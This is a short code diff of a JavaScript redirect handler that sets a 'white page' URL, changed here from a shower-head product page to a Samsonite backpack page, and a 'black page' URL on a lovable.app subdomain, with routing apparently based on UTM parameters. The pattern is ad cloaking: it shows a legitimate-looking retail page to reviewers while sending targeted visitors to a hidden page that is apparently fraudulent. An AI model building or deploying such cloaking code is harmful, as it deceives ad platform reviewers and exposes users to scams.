@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.ottiaustralia.com.au/product/7263-pavia-twin-shower-on-rail-250mm-shower-head-round-chrome?categoryId=523";
+    const whitePageURL = "https://www.samsonite.com.au/classic-leather/slim-backpack/ss-126036-1041.html";
     const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
